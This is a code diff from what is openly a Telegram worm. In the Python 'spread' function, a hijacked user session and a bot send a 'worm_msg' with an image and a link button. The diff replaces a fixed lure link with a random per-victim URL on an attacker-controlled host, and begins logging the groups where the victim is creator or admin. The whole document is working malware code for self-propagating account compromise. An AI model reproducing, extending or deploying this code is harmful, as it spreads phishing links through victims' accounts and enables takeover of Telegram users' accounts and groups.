@@ -79,17 +79,18 @@ async def spread(client, me, botinfo, log):
     if botinfo is None:
         return
     async with TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e').start(bot_token=botinfo['token']) as bot:
+        worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
         async with client.conversation(f"@{botinfo['username']}") as conv:
             msg = await conv.send_message("/start")
             await bot.send_message(
                 me.id,
                 strings['worm_msg'],
                 file='files/worm.png',
-                buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+                buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
                 link_preview=False
             )
             spread_msg = await conv.get_response()
-        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
+        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
     perm_logs = {
         'creator': [],
         'admin': [],
